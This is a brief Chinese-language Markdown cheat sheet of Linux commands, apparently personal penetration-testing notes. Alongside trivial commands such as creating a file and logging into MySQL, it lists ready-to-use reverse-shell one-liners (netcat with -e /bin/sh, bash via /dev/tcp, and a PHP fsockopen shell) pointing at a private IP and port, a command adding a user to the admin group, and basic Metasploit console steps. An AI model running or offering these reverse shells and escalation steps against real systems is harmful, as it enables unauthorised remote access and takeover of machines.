# LINUX 常用指令

## 基础指令

```bash
touch 文件名 #创建文件
mysql -u username -p #打开数据库
```

## 反弹shell

```bash
nc -e /bin/sh 192.168.205.138 8888
bash -i >& /dev/tcp/ip/端口 0>&1
python
php -r '$sock=fsockopen("192.168.205.138",8888);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## 提权

```bash
usermod -a -G admin 用户名 #需要root权限
```

## kali工具

```bash
msfconsole
search 关键字
use exploit
set parameter
run
```
